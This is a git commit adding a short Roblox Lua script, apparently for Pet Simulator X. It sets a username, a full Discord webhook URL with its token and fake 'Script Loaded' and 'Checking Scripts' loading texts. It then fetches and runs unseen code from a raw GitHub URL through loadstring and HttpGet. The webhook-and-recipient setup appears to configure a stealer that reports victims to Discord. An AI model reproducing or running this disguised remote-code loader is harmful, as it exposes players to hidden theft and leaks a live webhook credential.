05c8c46f1b343f84399e9773d6162d7af29c63a9
SpaceHubScript <133993886+SpaceHubScript@users.noreply.github.com>
2023-05-21 14:15:31 +0100

    Add files via upload
    psx

---
+++ dxzzy.lua
@@ -0,0 +1,8 @@
+Username = "pinwxlwrni"
+WebHook = "https://discord.com/api/webhooks/1109830109512335401/S7VjKY5s1Qv1ZEFuNmo7ZExgi7JH2gLGd4wHP5pK0x_ksXx-2u2SmkSQmzvSoMP8BKq-"
+loadingscreen = true
+_G.CustomScriptName = "Dxzzy Scripts"
+_G.Text1 = "Script Loaded..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua%22))()
